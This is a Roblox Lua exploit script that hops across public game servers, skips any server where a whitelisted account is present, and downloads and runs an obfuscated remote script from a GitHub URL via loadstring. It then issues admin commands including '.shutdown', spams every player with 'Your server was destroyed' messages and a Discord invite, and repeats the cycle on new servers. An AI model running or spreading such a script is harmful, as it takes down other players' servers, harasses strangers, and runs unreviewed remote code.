local Players = game:GetService("Players")
local HTTPService = game:GetService("HttpService")

local webLink = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
local lol = game.Players.LocalPlayer

function say(msg)
	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

 
 
wait(0.2)

local function serverHop()
    while true do
        local serverList = {}
        for _, v in pairs(HTTPService:JSONDecode(game:HttpGetAsync(webLink)).data) do
            if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
                table.insert(serverList,v.id)
            end
        end

        if #serverList > 0 then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, serverList[math.random(1, #serverList)])
            break
        end
    end
end 

wait(3)
local whitelisttoggle = true
local whitelisted = {"jhone_doee110101","TestAccountKRNL","egglnq","TechnoSniperX","TechnoReaperX","TechncReaperX","egglnqalt","The_NootNootLord","leakproof9853"}
if whitelisttoggle == true then
    for i,v in pairs(whitelisted) do
        if game.Players:FindFirstChild(v) then
          say("Your server has not been crashed due to the whitelisted user found: "..v)
          wait(0.4)
          task.spawn(serverHop)
        end
    end
end

print("no whitelisted people found :(")
wait(1)
loadstring(game:HttpGet('https://raw.githubusercontent.com/TheNootNootLord/BRO/main/Obfuscated_2.lua'))()
wait(0.9)



game.Players:Chat(".regen")
wait(0.4)
game.Players:Chat(".pads")
wait(0.3)
game.Players:Chat(".perm")
wait(0.4)
game.Players:Chat(":music 142912516")
wait(0.4)
game.Players:Chat(":h I rember 😀😀😀😀 Your server was destroyed by The Noot Noot Lord,  JOIN IF YOU WANT  desk o rd . gg/ kK Eq but way")
wait(0.2)
game.Players:Chat(":h I rember 😀😀😀😀 Your server was destroyed by The Noot Noot Lord,  JOIN IF YOU WANT  desk o rd . gg/ kK Eq but way")
wait(0.2)
game.Players:Chat(":h I rember 😀😀😀😀 Your server was destroyed by The Noot Noot Lord,  JOIN IF YOU WANT  desk o rd . gg/ kK Eq but way")
wait(0.2)
game.Players:Chat(":h I rember 😀😀😀😀 Your server was destroyed by The Noot Noot Lord,  JOIN IF YOU WANT  desk o rd . gg/ kK Eq but way")
wait(1.5)
game.Players:Chat(".shutdown")
wait(2) -- this is to prevent server hopping instantly


while wait(0.3) do
    task.spawn(serverHop)
end
